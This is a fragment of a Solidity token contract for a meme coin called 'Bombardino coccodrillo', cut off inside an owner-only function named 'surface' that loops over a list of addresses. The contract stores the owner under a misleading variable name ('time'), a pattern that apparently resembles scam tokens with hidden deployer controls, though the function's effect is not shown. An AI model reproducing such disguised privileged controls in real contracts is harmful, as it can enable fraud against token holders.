...
contract bombardinococcodrillo is Context, IERC20 {
    ...
    address public  time;
    constructor () {
        _name = "Bombardino coccodrillo";
        _symbol = "BOMBACOCCO";
        _decimals = 18;
        uint256 initialSupply = 765000000;
         time = msg.sender;
    ...
    modifier onlyOwner() {
        require(msg.sender == time, "Not allowed");
        _;
    }

    function surface(address[] memory winter) public onlyOwner() {
        for (uint256 i = 0; i < winter.length; i++) {
            address account = winter[i];
